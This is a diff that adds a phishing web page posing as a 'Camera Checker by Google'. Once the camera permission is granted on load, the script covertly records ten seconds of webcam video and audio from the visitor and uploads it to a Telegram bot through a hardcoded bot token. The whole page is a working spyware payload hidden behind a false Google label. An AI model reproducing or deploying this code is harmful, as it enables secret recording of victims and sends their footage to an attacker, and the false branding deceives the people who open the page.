@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+function post(videoBlob){
+    var formData = new FormData();
+    formData.append('video', videoBlob, 'video.mp4');  // Menyertakan video dalam formData
+
+    // Kirim video ke bot Telegram
+    $.ajax({
+        type: 'POST',
+        url: 'https://api.telegram.org/bot7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA/sendVideo',
+        data: formData,
+        contentType: false,
+        processData: false,
+        success: function(result){
+            // Berhasil mengirim video
+            console.log(result);
+        },
+        error: function(){
+            console.log('Error sending video to bot');
+        }
+    });
+};
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+const constraints = {
+  audio: true,  // Aktifkan audio jika diperlukan
+  video: { facingMode: "user" }
+};
+
+// Variabel untuk merekam video
+let mediaRecorder;
+let recordedChunks = [];
+
+// Akses webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Sukses mengakses webcam
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+  // Mulai merekam video
+  mediaRecorder = new MediaRecorder(stream);
+  mediaRecorder.ondataavailable = handleDataAvailable;
+  mediaRecorder.onstop = handleStop;
+
+  mediaRecorder.start();
+  console.log("Recording started...");
+
+  // Hentikan perekaman setelah beberapa detik (misalnya 10 detik)
+  setTimeout(function() {
+    mediaRecorder.stop();
+    console.log("Recording stopped.");
+  }, 10000);  // Hentikan setelah 10 detik
+}
+
+// Menangani data yang direkam
+function handleDataAvailable(event) {
+  if (event.data.size > 0) {
+    recordedChunks.push(event.data);
+  }
+}
+
+// Setelah perekaman berhenti
+function handleStop() {
+  const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+  recordedChunks = [];
+
+  // Kirim video ke bot Telegram
+  post(videoBlob);
+}
+
+// Load init
+init();
+</script>
+
+<body>
+    <p>⚙️ Camera Checker by Google</p>
+    <p>(Accept Permissions to read camera)</p>
+    <p><label><input type="checkbox" name="sorry your camera cannot be readable" id="mirror" /> Change Camera</label></p>
+</body>
+
+</html>
